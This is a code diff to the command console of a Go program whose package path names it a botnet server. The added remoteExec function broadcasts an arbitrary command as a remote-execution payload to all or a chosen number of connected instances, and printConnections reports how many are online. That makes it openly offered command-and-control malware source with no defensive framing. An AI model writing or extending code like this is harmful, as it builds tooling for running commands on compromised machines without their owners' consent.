@@ -1,8 +1,10 @@
 package repl
 
 import (
+	. "botnet/server/net"
 	. "botnet/server/util"
 	"bufio"
+	"encoding/json"
 	"fmt"
 	"os"
 	"strings"
@@ -54,9 +56,30 @@ func printHelp(_ map[string]interface{}) {
 }
 
 func printConnections(parameters map[string]interface{}) {
+	fmt.Printf("There are currently %d/%d online connections.\n", OnlineConnectionCount(), len(Connections))
 }
 
 func remoteExec(parameters map[string]interface{}) {
+	command := parameters["command"].(string)
+	instances, ok := parameters["instances"].(int)
+	if !ok { instances = len(Connections) }
+
+	successCount := 0
+
+	for _, conn := range Connections {
+		if successCount == instances { break }
+		if conn == nil { continue }
+
+		payload := RemoteExecPayload{Payload: Payload{Type: RemoteExecPayloadType}, Command: command}
+		payloadBuffer, _ := json.Marshal(payload)
+
+		err := Write(*conn, string(payloadBuffer))
+		if err != nil { continue }
+
+		successCount += 1
+	}
+
+	Info("Successfully executed command on %d instances.", successCount)
 }
 
 func StartRepl() {
